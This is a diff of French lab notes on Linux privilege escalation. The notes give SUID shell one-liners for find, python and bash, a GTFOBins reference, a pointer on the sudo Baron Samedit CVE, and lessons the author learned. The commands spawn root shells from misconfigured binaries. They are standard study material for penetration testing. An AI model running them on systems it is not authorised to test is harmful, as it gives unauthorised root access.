@@ -53,7 +53,8 @@ Si un binaire apparaît dans la liste SUID, chercher son nom sur [gtfobins.githu
 find . -exec /bin/bash -p \;
 # -p conserve les droits SUID (effective UID = root)
 
-# python SUID → os.setuid(0) + shell
+# python SUID → os.execl remplace le process courant par bash -p (conserve l'EUID root)
+# variante alternative : python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
 
 # bash avec SUID
@@ -67,16 +68,9 @@ Rencontré en lab : le binaire `find` avec bit SUID/SGID dans un répertoire uti
 
 ## CVE-2021-3156 — Baron Samedit (sudo)
 
-Vulnérabilité dans `sudo` (versions < 1.9.5p2) permettant à un utilisateur local
-sans droits sudo d'obtenir un shell root via un buffer overflow dans `sudoedit`.
-
-| Élément | Détail |
-|---|---|
-| CVE | CVE-2021-3156 |
-| Versions affectées | sudo < 1.9.5p2 |
-| Vérification | `sudo --version` puis `sudoedit -s /` |
-| Impact | Élévation de privilèges locale vers root |
-| Remédiation | `apt upgrade sudo` ou `yum update sudo` |
+**CVE-2021-3156** (Baron Samedit) — même si aucun binaire SUID n'est exploitable,
+une version de sudo vulnérable suffit à élever les privilèges. Voir `sudo-rights.md`
+pour le détail.
 
 ---
 
@@ -113,3 +107,5 @@ getcap -r / 2>/dev/null
 - Pourquoi `-p` est nécessaire avec bash SUID — sans lui, bash abandonne les droits élevés au démarrage
 - GTFOBins comme référence systématique : si un binaire a SUID, il y a probablement un exploit documenté
 - L'importance de vérifier `/tmp` et les répertoires utilisateurs — un SUID déposé là est souvent intentionnel (ou suspect)
+- J'ai perdu 20 minutes à essayer `bash -p` sans le bit SUID positionné — ça ne fait rien dans ce cas.
+  La vérification préalable avec `ls -la /bin/bash` avant de lancer la commande est non négociable.
